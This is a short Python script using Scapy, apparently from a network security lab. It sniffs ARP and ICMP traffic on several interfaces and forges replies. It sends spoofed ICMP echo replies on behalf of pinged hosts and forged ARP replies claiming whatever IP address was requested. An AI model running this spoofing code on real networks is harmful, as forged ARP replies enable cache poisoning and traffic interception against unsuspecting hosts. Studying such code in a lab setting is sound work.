from scapy.all import*

def spoof(pkt):

	if ICMP in pkt and pkt[ICMP].type == 8:
		print("Default packet:")
		print("Source IP:",pkt[IP].src)
		print("Destination IP:", pkt[IP].dst)


		#filling in the packet information
		ip = IP(src=pkt[IP].dst,dst=pkt[IP].src,ihl=pkt[IP].ihl)
		icmp = ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)
		data = pkt[Raw].load
		newpkt = ip/icmp/data

		print("spoofed packet:")
		print("Source IP: ", newpkt[IP].src)
		print("Destination IP: ", newpkt[IP].dst)
		send(newpkt,verbose=0)

	if pkt.haslayer(ARP) and pkt[ARP].op == 1:

		newArp = ARP(hwlen=6,plen=4,op=2,pdst=pkt[ARP].psrc,hwdst=pkt[ARP].hwsrc, psrc=pkt[ARP].pdst)
		send(newArp,verbose=0)

interfaces = ['br-11ccd7f3cf1d','br-334fd5f10716','enp0s3','lo']

pkt = sniff(iface = interfaces, filter='arp or icmp', prn=spoof)